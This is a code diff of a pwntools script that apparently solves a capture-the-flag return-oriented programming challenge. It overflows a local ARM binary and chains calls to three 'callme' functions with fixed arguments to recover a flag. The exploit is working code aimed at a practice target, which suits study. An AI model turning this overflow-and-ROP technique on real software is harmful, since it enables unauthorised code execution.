@@ -10,18 +10,22 @@ context.binary = BINARY
 p = process(BINARY)
 
 pop_r012_lr_pc = p32(0x10870) # pop {r0, r1, r2, lr, pc}
+callme_one     = p32(0x10618) # <callme_one@plt>
+callme_two     = p32(0x1066C) # <callme_two@plt>
+callme_three   = p32(0x1060C) # <callme_three@plt>
 
-for func in ['callme_one', 'callme_two', 'callme_three']:
+for func in [callme_one, callme_two, callme_three]:
     rop = b"A" * 36
     rop += pop_r012_lr_pc
     rop += p32(0xdeadbeef)
     rop += p32(0xcafebabe)
     rop += p32(0xd00df00d)
-    rop += p32(ELF.symbols['pwnme'])
-    rop += p32(ELF.symbols[func])
+    rop += p32(ELF.symbols["pwnme"])
+    rop += func
     
+    #pause()
     p.sendline(rop)
     log.success(f"ROPchain = {rop}")
 
-flag = p.recv().split(b'\n')#[-2]
+flag = p.recvall(timeout=1).split(b'\n')#[-2]
 log.success(f"FLAG : {flag}")
